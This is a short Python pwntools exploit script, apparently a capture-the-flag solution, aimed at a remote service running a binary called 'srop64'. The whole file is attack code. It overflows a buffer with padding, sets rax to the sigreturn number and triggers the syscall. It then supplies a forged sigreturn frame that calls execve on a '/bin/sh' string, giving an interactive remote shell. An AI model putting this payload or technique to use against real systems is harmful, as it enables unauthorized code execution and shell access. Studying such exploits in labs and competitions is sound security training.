from pwn import *
p = remote("realsung.kr", 13338)
# p = process('./srop64')
e = ELF("./srop64")

sa = lambda x, y : p.sendafter(x, y)
sla = lambda x, y : p.sendlineafter(x, y)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
rvl = lambda : p.recvline()
rvu = lambda x : p.recvuntil(x)

pop_rax = 0x00000000004005ea
syscall = 0x00000000004005f3
binsh = 0x4006e4

frame = SigreturnFrame(arch='amd64')
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = syscall

payload = b''
payload += b'A' * 0x10 + b'B' * 0x8

payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)

payload += bytes(frame)

pause()
sl(payload)

p.interactive()